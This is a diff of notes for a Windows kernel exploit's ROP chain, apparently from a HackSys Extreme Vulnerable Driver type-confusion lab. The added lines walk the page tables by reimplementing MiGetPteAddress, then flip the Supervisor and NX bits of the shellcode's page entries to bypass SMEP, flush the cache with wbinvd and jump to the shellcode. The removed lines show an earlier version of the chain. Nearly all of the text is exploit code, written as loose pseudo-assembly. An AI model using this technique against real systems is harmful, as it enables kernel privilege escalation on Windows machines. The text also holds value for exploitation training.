@@ -1,15 +1,66 @@
-source: https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html
+; Findnig the PTE address
+pop rax                          
+shellcode_addr                
+rax >> 9                         ; Shift shellcode of address 9 times to right
+pop rcx
+0x7FFFFFFFF8
+and rax, rcx                     ; AND shellcode with 0x7FFFFFFFF8
+pop rcx
+MiGetPteAddress_off_0x13
+mov rcx, [rcx]                   ; Get the value at MiGetPteAddress_off_0x13
+add rax, rcx                     ; Address of PTE in rax
 
-pop rcx                 ; rcx = shellcode address
-call MiGetPteAddress    
-mov r8, rax             ; rax = r8 = Shellcode's PTE address
-mov rdx, r8             ; rdx = Shellcode's PTE address
-mov rax, [rax]          ; rax = Shellcode's PTE value
-mov r8, rax             ; r8 = Shellcode's PTE value
-mov rcx, r8             ; rcx = Shellcode's PTE value
-mov rax, 4              
-sub rcx, rax            ; The Owner flag is the 3rd bit. It was 1 (Owner=Usermode) so by subtracting 4 from it we clear that bit and make it Owner=Kernel
-mov rax, rcx            ; rax = modified PTE value
-mov [rdx], rax          ; save the modified PTE value back into the PTE address
-wbinvd                  ; Clear the TLB Cache
-call shellcode 
+; Finding the PDE address
+rax >> 9
+pop rcx
+0x7FFFFFFFF8
+and rax, rcx
+pop rcx
+MiGetPteAddress_off_0x13
+mov rcx, [rcx]
+add rax, rcx                     ; Address of PDE in rax 
+
+; Finding the PPE address
+rax >> 9
+pop rcx
+0x7FFFFFFFF8
+and rax, rcx
+pop rcx
+MiGetPteAddress_off_0x13
+mov rcx, [rcx]
+add rax, rcx                     ; Address of PPE in rax
+
+; Finding the PXE address
+rax >> 9
+pop rcx
+0x7FFFFFFFF8
+and rax, rcx
+pop rcx
+MiGetPteAddress_off_0x13
+mov rcx, [rcx]
+add rax, rcx                     ; Address of PXE in rax
+
+Modifying the PXE value
+mov rdx, rax                     ; Back up PXE address in rdx
+mov rax, [rax]                   ; Get PXE value
+pop rcx
+0x04
+sub rax, rcx                     ; Set Supervisor bit
+pop rcx 
+0x8000000000000000               
+sub rax, rcx                     ; Set Executable bit
+mov [rdx], rax                   ; Copy the modified value back to PXE address
+
+Modifying the PTE value
+pop rcx 
+shellcode_addr
+MiGetPteAddress_addr
+mov rdx, rax
+mov rax, [rax]
+pop rcx
+0x04 
+sub rax, rcx                     ; Already executable so just set Supervisor bit 
+mov [rdx], rax 
+
+wbinvd
+shellcode_addr
